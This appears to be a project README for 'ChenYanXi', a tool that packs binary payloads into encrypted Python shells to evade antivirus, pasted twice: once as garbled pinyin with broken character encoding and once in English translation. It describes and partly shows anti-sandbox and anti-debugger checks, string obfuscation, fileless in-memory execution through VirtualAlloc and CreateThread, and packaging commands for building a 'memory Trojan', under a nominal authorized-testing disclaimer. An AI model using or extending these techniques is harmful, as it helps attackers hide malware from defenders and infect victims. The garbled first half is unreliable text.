# ğŸ§¬ ChenYanXiÂ· gÄojÃ­ duÅ cÃ©ng jiÄmÃ¬ miÇn shÄ kÃ© shÄ“ngchÃ©ng qÃ¬ > ğŸ‘¤ zuÃ²zhÄ›:**Mingshenhk** > ğŸ¯ yÃ²ngtÃº: Ä€nquÃ¡n yÃ¡njiÅ«/ jiÄ kÃ© shÃ­yÃ n/ miÇn shÄ cÃ¨shÃ¬ > âš ï¸ **miÇnzÃ© shÄ“ngmÃ­ng: BÄ›n gÅngjÃ¹ jÇn xiÃ n jiÃ oxuÃ© yÇ” shÃ²uquÃ¡n cÃ¨shÃ¬, jÃ¬nzhÇ yÃ²ng yÃº rÃ¨nhÃ© fÄ“ifÇ yÃ²ngtÃº!** --- ## ğŸ“– XiÃ ngmÃ¹ gÃ ishÃ¹ **ChenYanXi** shÃ¬ yÄ«gÃ¨ zhuÄn wÃ©i ÄnquÃ¡n yÃ¡njiÅ« rÃ©nyuÃ¡n yÇ” hÃ³ng duÃ¬ cÃ¨shÃ¬ zhÄ› shÃ¨jÃ¬ de gÄojÃ­ kÃ© tÇ shÄ“ngchÃ©ng kuÃ ngjiÃ , jÄ«yÃº Python shÃ­xiÃ n, rÃ³nghÃ© duÅ cÃ©ng dÃ²ngtÃ i jiÄmÃ¬, kÃ²ngzhÃ¬ liÃº rÇoluÃ n, xÅ«nÇ jÄ« jiÇncÃ¨, wÃº wÃ©njiÃ n zhÃ­xÃ­ng dÄ›ng hÃ©xÄ«n jÃ¬shÃ¹. TÄ kÄ›yÇ jiÄng Ã¨rjÃ¬nzhÃ¬ Payload(rÃº `.Elf`,`.Exe`) fÄ“ngzhuÄng wÃ¨i fÃ¹zÃ¡ de Python kÃ© tÇ, jÃ¹bÃ¨i**qiÃ¡ng kÃ ng fÄ“nxÄ« nÃ©nglÃ¬, jÃ­ dÄ« chÃ¡ shÄ lÇœ yÇ” duÅ pÃ­ngtÃ¡i jiÄnrÃ³ng xÃ¬ng**, bÃ¬ng kÄ› tÅngguÃ² Nuitka jÃ¬nyÄ«bÃ¹ shÄ“ngchÃ©ng gÄodÃ¹ yÇnnÃ¬ de dÄn wÃ©njiÃ n zhÃ­xÃ­ng chÃ©ngxÃ¹. --- ## âœ¨ GÅngnÃ©ng tÃ¨xÃ¬ng | mÃ³kuÃ i | miÃ¡oshÃ¹ | | ------------------ | ----------------------------------- | | ğŸ”**duÅ cÃ©ng jiÄmÃ¬ + yÄsuÅ** | zhÄ«chÃ­ zuÃ¬duÅ 18 cÃ©ng `zlib`+ AES/DES hÃ¹nhÃ© jiÄmÃ¬ | | ğŸ”‘**dÃ²ngtÃ i mÃ¬ yÃ o pÃ ishÄ“ng** | shÇyÃ²ng `PBKDF2-HMAC-SHA256`jiÄ yÃ¡n mÃ¬ yÃ o yÇnshÄ“ng, cÃ©ng cÃ©ng bÃ¹tÃ³ng | | ğŸŒ€**kÃ²ngzhÃ¬ liÃº wÃ¨izhuÄng** | zÃ¬dÃ²ng chÄrÃ¹ wÃº hÃ i fÄ“nzhÄ«, rÇoluÃ n chÃ©ngxÃ¹ liÃºchÃ©ng fÄ“nxÄ« | | ğŸ”**fÇn shÄ xiÄng/ fÇn tiÃ¡oshÃ¬/ fÇn zhuÄ bÄo** | jiÇncÃ¨ VM, tiÃ¡oshÃ¬ qÃ¬, zhuÄ bÄo qÃ¬, yÄ«dÃ n mÃ¬ngzhÃ²ng lÃ¬jÃ­ tuÃ¬chÅ« | | ğŸ§±**zÃ¬fÃº chuÃ n hÃ¹nxiÃ¡o** | suÇ’yÇ’u mÇngÇn zÃ¬fÃº chuÃ n `chr()`pÄ«njiÄ“, duÇ’bÃ¬ tÃ¨zhÄ“ng pÇpÃ¨i | | ğŸ§¬**nÃ¨icÃºn jiÄzÃ i zhÃ­xÃ­ng** | jÇn jiÄzÃ i jÃ¬n RAM, bÃ¬miÇn luÃ² pÃ¡n, kÃ ng shÄ ruÇn sÇomiÃ¡o | | ğŸ—‚ï¸ **zhÃ¹cÃ¨ biÇo wÄ›i zhÃ¹ liÃº (mÃ³nÇ)** | xÅ«nÇ tiÄnjiÄ qÇdÃ²ng xiÃ ng, wÃº zhÄ“nshÃ­ xiÄ› rÃ¹, mÃ­huÃ² fÄ“nxÄ« qÃ¬ | --- ## âš™ï¸ jÃ¬shÃ¹ yuÃ¡nlÇ ### ğŸ” duÅ cÃ©ng jiÄmÃ¬ luÃ³jÃ­ mÄ›i cÃ©ng zhÃ­ hÃ¡ng rÃºxiÃ  chu lÇ: 1. YuÃ¡nshÇ shÃ¹jÃ¹ shÇyÃ²ng `zlib`yÄsuÅ 2. TiÄnjiÄ wÃ¨izhuÄng zÃ¬ jiÃ© gÄnrÇo tÃ¨zhÄ“ng shÃ¬biÃ© 3. SuÃ­jÄ« shÇyÃ²ng AES huÃ² DES(CBC) duÃ¬chÃ¨n jiÄmÃ¬ 4. JiÄmÃ¬ jiÃ©guÇ’ zÃ i Base64 fÄ“ngzhuÄng duÅ dÃ¡**zuÃ¬duÅ 18 cÃ©ng qiÃ n tÃ o shÃ¬ chÇ”lÇ**, gÃ²ujiÃ n â€œyÃ¡ngcÅng kÃ©â€, jÃ­ nÃ¡n nÃ¬xiÃ ng. --- ### ğŸ”‘ MÃ¬ yÃ o pÃ ishÄ“ng shÃ¨jÃ¬ mÄ›i cÃ©ng shÇyÃ²ng dÃºlÃ¬ mÃ¬ yÃ o yÇ” IV, pÃ ishÄ“ng fÄngshÃ¬: ```Python hashlib.Pbkdf2_hmac("sha256", secret, salt, 100000, dklen=32) ``` * `secret`yÇ” `salt`jÅ«n shÇyÃ²ng `get_random_bytes()`shÄ“ngchÃ©ng * fÃ¡ngzhÇ mÃ¬ yÃ o zhÃ²ngyÃ²ng yÇ” jÃ¬ngtÃ i mÃ³shÃ¬ shÃ¬biÃ© --- ### ğŸŒ€ kÃ²ngzhÃ¬ liÃº + zÃ¬fÃº chuÃ n hÃ¹nxiÃ¡o shÃ¬lÃ¬ wÃ¨izhuÄng kÃ²ngzhÃ¬ liÃº yÇ”jÃ¹: ```Python if random.Random() < 0.99: Pass # kÃ²ngzhÃ¬ liÃº zÃ oshÄ“ng ``` guÄnjiÃ n zÃ¬fÃº chuÃ n hÃ¹nxiÃ¡o (lÃ¬rÃº zhÃ¹cÃ¨ biÇo lÃ¹jÃ¬ng): ```Python reg_key = chr(83)+chr(111)+chr(102)+chr(116)+... ``` --- ### ğŸ” ShÄ xiÄng/ tiÃ¡oshÃ¬ jiÇncÃ¨ dÃ imÇ ```python def is_debugged(): Return ctypes.Windll.Kernel32.IsDebuggerPresent() def is_vm(): Return any(x in platform.Platform().Lower() for x in ["vbox", "vmware", "qemu", "sandbox"]) ``` rÃº mÃ¬ngzhÃ²ng jiÇncÃ¨, lÃ¬jÃ­ zhÅngzhÇ zhÃ­xÃ­ng. --- ### ğŸ§¬ NÃ¨icÃºn jiÄzÃ i zhÃ­xÃ­ng jÄ«zhÃ¬ (Windows) ```python ptr = VirtualAlloc(...) RtlMoveMemory(ptr, payload, ...) CreateThread(..., Ptr, ...) ``` * QuÃ¡n guÃ²chÃ©ng yÃ¹nxÃ­ng zÃ i nÃ¨icÃºn zhÅng * bÃ¹ luÃ²dÃ¬ wÃ©njiÃ n, bÃ¬ kÄi dÃ  duÅshÃ¹ shÄdÃº jiÇncÃ¨ --- ## shÇyÃ²ng mÃ¬nglÃ¬ng --- ``` usage: Chenyanxi.Exe [-h] [-l LAYERS] [--no-drop] payload OR usage:./Chenyanxi [-h] [-l LAYERS] [--no-drop] payload positional arguments: Payload kÄ› zhÃ­xÃ­ng yÇ’uxiÃ o fÃ¹zÇi de wÃ©njiÃ n (lÃ¬rÃº,shell.Exe,shell.Elf) options: -H, --help show this help message and exit -l LAYERS, --layers LAYERS jiÄmÃ¬ cÃ©ng (1-18), mÃ²rÃ¨n shÃ¬ 3 --no-drop jÇn zÃ i nÃ¨icÃºn zhÅng yÃ¹nxÃ­ng ``` --- ## ğŸš€ shÇyÃ²ng fÄngfÇ 1. ZhÇ”nbÃ¨i yÄ«gÃ¨ Ã¨rjÃ¬nzhÃ¬ Payload(rÃº `.Elf`,`.Exe`), mÃ¬ngmÃ­ng wÃ¨i: ``` Shell.Elf shell.Exe ``` 2. YÃ¹nxÃ­ng kÃ© tÇ shÄ“ngchÃ©ng qÃ¬: ```Bash ./Chenyanxi -l 18 shell.Elf huÃ²zhÄ› chenyanxi.Exe -l 18 shell.Exe ``` 3. ShÅ«chÅ« jiÃ©guÇ’ wÃ¨i miÇn shÄ kÃ© tÇ jiÇobÄ›n: ``` Packed_shell.Py ``` --- ## ğŸ§° xiÃ ngmÃ¹ jiÃ©gÃ²u ``` chenyanxi/ â”œâ”€â”€ chenyanxi # zhÇ” shÄ“ngchÃ©ng qÃ¬ jiÇobÄ›n â”œâ”€â”€ shell.Elf # shÃ¬lÃ¬ Payload(Ã¨rjÃ¬nzhÃ¬) â”œâ”€â”€ shell.Exe â”œâ”€â”€ chenyanxi.Exe â”œâ”€â”€ ultra_shell.Py # shÅ«chÅ« dÃ i kÃ© Python mÃ¹mÇ â”œâ”€â”€ image/ # jiÃ©tÃº mÃ¹lÃ¹ â””â”€â”€ README.Md # bÄ›n wÃ©ndÃ ng ``` --- ## ğŸ§ª Windows dÇbÄo jiÃ nyÃ¬ (Nuitka) ÄnzhuÄng yÄ«lÃ i: ``` Pip install pycryptodome psutil nuitka ``` shÇyÃ²ng Nuitka dÇbÄo: ``` Nuitka --mingw64 --standalone --onefile packed_shell.Py ``` zuÃ¬zhÅng shÅ«chÅ«: ``` Packed_shell.Exe ``` --- ## ğŸ§ª Linux dÇbÄo jiÃ nyÃ¬ (Nuitka + UPX) ÄnzhuÄng yÄ«lÃ i: ```Bash sudo apt update pip install nuitka pycryptodome psutil sudo apt install patchelf upx makeself ``` shÇyÃ²ng Nuitka dÇbÄo: ```Bash nuitka --follow-imports --standalone --onefile packed_shell.Py ``` yÄsuÅ zhÇ” kÄ› zhÃ­xÃ­ng wÃ©njiÃ n: ```Bash strip packed_shell.Dist/packed_shell.Bin upx -9 packed_shell.Dist/packed_shell.Bin ``` shÄ“ngchÃ©ng dÄn wÃ©njiÃ n yÃ¹nxÃ­ng bÄo: ```Bash sudo apt install makeself makeself --nox11 packed_shell.Dist/ packed_shell.Run"Packed Shell Installer" ./Packed_shell.Bin ``` zuÃ¬zhÅng shÅ«chÅ«: ``` Packed_shell.Run ï¿© kÄ› zhÃ­jiÄ“ zhÃ­xÃ­ng, zÃ¬dÃ²ng jiÄ›yÄ + jiÄzÃ i nÃ¨icÃºn mÃ¹mÇ ``` jiÃ©guÇ’: <Img src="image/Screenshot 2025-06-24 185736.Png" width="600"/> <img src="image/Screenshot 2025-06-24 185655.Png" width="600"/> huÃ²zhÄ› win hÃ© Linux kÄ›yÇ shÇyÃ²ng pyinstaller(bÃ¹ tuÄ«jiÃ n): ``` Pyinstaller --onefile packed_shell.Py ``` <img src="image/Screenshot 2025-06-24 185736.Png" width="600"/> <img src="image/Screenshot 2025-06-24 185656.Png" width="600"/> --- ## ğŸ“Œ zhÃ¹yÃ¬ shÃ¬xiÃ ng * xiÃ ngmÃ¹ yÄ«lÃ i: ```Bash pip install pycryptodome psutil nuitka ``` * mÃ²rÃ¨n zhÄ“nduÃ¬ Windows pÃ­ngtÃ¡i (bÄohÃ¡n `winreg`, `ctypes.Windll`), rÃº yÃ²ng yÃº Linux kÄ›nÃ©ng yÇ’u yÄ«xiÄ“ wÃ¨izhÄ« de wÃ¨ntÃ­; * jiÃ nyÃ¬ dÄpÃ¨i `pyarmor`,`obfuscator-llvm`dÄ›ng gÅngjÃ¹ jÃ¬nyÄ«bÃ¹ jiÄ kÃ© hÃ¹nxiÃ¡o. --- ## ğŸ“¢ MiÇnzÃ© shÄ“ngmÃ­ng > bÄ›n xiÃ ngmÃ¹ jÇn gÅng hÃ©fÇ shÃ²uquÃ¡n cÃ¨shÃ¬, jiÃ oxuÃ© yÃ¡njiÅ« yÃ²ngtÃº. JÃ¬nzhÇ jiÄng bÄ›n gÅngjÃ¹ yÃ²ng yÃº rÃ¨nhÃ© fÄ“ifÇ xÃ­ngwÃ©i, wÃ©i zhÄ› hÃ²uguÇ’ zÃ¬fÃ¹, zuÃ²zhÄ› gÃ i bÃ¹ fÃ¹zÃ©! --- ## â­ MÃ­ngxiÃ¨ yÇ” yÇnyÃ²ng * [PyCryptodome](https://Github.Com/Legrandin/pycryptodome) - gÄojÃ­ jiÄmÃ¬ kÃ¹ * [Metasploit Framework](https://Github.Com/rapid7/metasploit-framework) * [Veil Framework](https://Github.Com/Veil-Framework/Veil) * APT nÃ¨icÃºn kÃ© yÃ¡njiÅ« wÃ©nxiÃ n, nÃ¬xiÃ ng yÇ” jiÄ kÃ© jÃ¬shÃ¹ yÃ¡njiÅ« tuÃ¡nduÃ¬ --- ## â¤ï¸ zhÄ«chÃ­ xiÃ ngmÃ¹ rÃºguÇ’ nÇ juÃ©dÃ© bÄ›n xiÃ ngmÃ¹ yÇ’u bÄngzhÃ¹, qÇng diÇnjÄ« â­Star zhÄ«chÃ­! HuÄnyÃ­ng Fork, tÃ­ Issue, tÃ­jiÄo PR yÄ«qÇ wÃ¡nshÃ n! ---
å±•å¼€
4,333 / 5,000
# ğŸ§¬ ChenYanXi Â· Advanced multi-layer encryption and anti-killing shell generator

> ğŸ‘¤ Author: **Mingshenhk**
> ğŸ¯ Purpose: Security research / shell experiment / anti-killing test
> âš ï¸ **Disclaimer: This tool is limited to teaching and authorized testing, and is prohibited from being used for any illegal purpose! **

---

## ğŸ“– Project Overview

**ChenYanXi** is an advanced shell generation framework designed for security researchers and red team testers. It is based on Python implementation and integrates core technologies such as multi-layer dynamic encryption, control flow disruption, virtual machine detection, and fileless execution.

It can encapsulate binary Payloads (such as `.elf`, `.exe`) into complex Python shells, with **strong anti-analysis capabilities, extremely low detection and killing rates, and multi-platform compatibility**, and can further generate highly hidden single-file executable programs through Nuitka.

---

## âœ¨ Features

| Module | Description |
| ------------------ | ----------------------------------- |
| ğŸ” **Multi-layer encryption + compression** | Supports up to 18 layers of `zlib` + AES/DES hybrid encryption |
| ğŸ”‘ **Dynamic key derivation** | Use `PBKDF2-HMAC-SHA256` to derive salted keys, each layer is different |
| ğŸŒ€ **Control flow camouflage** | Automatically insert harmless branches to disrupt program flow analysis |
| ğŸ” **Anti-sandbox / anti-debugging / anti-capture** | Detect VM, debugger, and capture device, and exit immediately once hit |
| ğŸ§± **String obfuscation** | All sensitive strings `chr()` are concatenated to avoid feature matching |
| ğŸ§¬ **Memory load and execute** | Only load into RAM to avoid disk drop and anti-virus software scanning |
| ğŸ—‚ï¸ **Registry pseudo-residence (simulation)** | Virtually add startup items, no real write, confuse analyzer |

---

## âš™ï¸ Technical principle

### ğŸ” Multi-layer encryption logic

Each layer performs the following processing:

1. The original data is compressed using `zlib`

2. Add disguised bytes to interfere with feature recognition

3. Randomly use AES or DES (CBC) symmetric encryption

4. The encryption result is then encapsulated in Base64

Up to **up to 18 layers of nested processing**, building an "onion shell", which is extremely difficult to reverse.

---

### ğŸ”‘ Key derivation design

Each layer uses independent keys and IVs, derived as follows:

```python
hashlib.pbkdf2_hmac("sha256", secret, salt, 100000, dklen=32)
```

* Both `secret` and `salt` are generated using `get_random_bytes()`
* Prevent key reuse and static pattern recognition

---

### ğŸŒ€ Control flow + string obfuscation example

Disguise control flow statements:

```python
if random.random() < 0.99:
pass # Control flow noise
```

Key string obfuscation (e.g. registry path):

```python
reg_key = chr(83)+chr(111)+chr(102)+chr(116)+...
```

---

### ğŸ” Sandbox / debug detection code

```python
def is_debugged():
return ctypes.windll.kernel32.IsDebuggerPresent()

def is_vm():
return any(x in platform.platform().lower() for x in ["vbox", "vmware", "qemu", "sandbox"])
```

If the detection is hit, terminate the execution immediately.

---

### ğŸ§¬ Memory loading and execution mechanism (Windows)

```python
ptr = VirtualAlloc(...)
RtlMoveMemory(ptr, payload, ...)
CreateThread(..., ptr, ...)
```

* The whole process runs in memory
* No files are dropped, avoiding most antivirus detection

---

## Use command

---
```
usage: chenyanxi.exe [-h] [-l LAYERS] [--no-drop] payload

OR

usage:./chenyanxi [-h] [-l LAYERS] [--no-drop] payload

positional arguments:
payload file that can execute the payload (e.g., shell.exe, shell.elf)

options:
-h, --help show this help message and exit
-l LAYERS, --layers LAYERS
Encryption layer (1-18), default is 3
--no-drop Run only in memory
```
---

## ğŸš€ Usage

1. Prepare a binary Payload (such as `.elf`, `.exe`), named:

```
shell.elf

shell.exe
```

2. Run the shell generator:

```bash
./chenyanxi -l 18 shell.elf

or

chenyanxi.exe -l 18 shell.exe
```

3. The output result is a kill-free shell script:

```
packed_shell.py
```

---

## ğŸ§° Project structure

```
chenyanxi/
â”œâ”€â”€ chenyanxi # Main generator script
â”œâ”€â”€ shell.elf # Sample Payload (binary)
â”œâ”€â”€ shell.exe
â”œâ”€â”€ chenyanxi.exe
â”œâ”€â”€ ultra_shell.py # Output Python with shell Trojan
â”œâ”€â”€ image/ # Screenshot directory
â””â”€â”€ README.md # This document
```
---
## ğŸ§ª Windows packaging suggestions (Nuitka)

Installation dependencies:
```
pip install pycryptodome psutil nuitka
```
Use Nuitka packaging:
```
nuitka --mingw64 --standalone --onefile packed_shell.py

```

Final output:
```
packed_shell.exe

```
---

## ğŸ§ª Linux packaging suggestions (Nuitka + UPX)

Installation dependencies:

```bash
sudo apt update
pip install nuitka pycryptodome psutil
sudo apt install patchelf upx makeself
```

Use Nuitka packaging:

```bash
nuitka --follow-imports --standalone --onefile packed_shell.py
```

Compress the main executable file:

```bash
strip packed_shell.dist/packed_shell.bin
upx -9 packed_shell.dist/packed_shell.bin
```

Generate a single file running package:

```bash
sudo apt install makeself
makeself --nox11 packed_shell.dist/ packed_shell.run "Packed Shell Installer" ./packed_shell.bin
```

Final output:

```
packed_shell.run â† can be directly executed, automatically decompressed + load memory Trojan
```
Result:

<img src="image/Screenshot 2025-06-24 185736.png" width="600"/>
<img src="image/Screenshot 2025-06-24 185655.png" width="600"/>

Or you can use pyinstaller for win and Linux (not recommended):

```
pyinstaller --onefile packed_shell.py
```

<img src="image/Screenshot 2025-06-24 185736.png" width="600"/>
<img src="image/Screenshot 2025-06-24 185656.png" width="600"/>
---

## ğŸ“Œ Notes

* Project dependencies:

```bash
pip install pycryptodome psutil nuitka
```
* By default, it targets Windows platform (including `winreg`, `ctypes.windll`). If used for Linux, there may be some unknown problems;

* It is recommended to use tools such as `pyarmor` and `obfuscator-llvm` to further add shell obfuscation.

---

## ğŸ“¢ Disclaimer

> This project is only for legal authorized testing, teaching and research purposes. It is forbidden to use this tool for any illegal behavior. Violators will be at their own risk and the author will not be responsible!

---

## â­ Acknowledgements and References

* [PyCryptodome](https://github.com/Legrandin/pycryptodome) - Advanced encryption library

* [Metasploit Framework](https://github.com/rapid7/metasploit-framework)

* [Veil Framework](https://github.com/Veil-Framework/Veil)

* APT memory shell research literature, reverse and shell technology research team

---

## â¤ï¸ Support the project

If you think this project is helpful, please click â­Star to support it!
Welcome to fork, issue, submit PR to improve it together!

---
å‘é€åé¦ˆ
å¤åˆ¶
æœ‰ç¿»è¯‘ç»“æœ
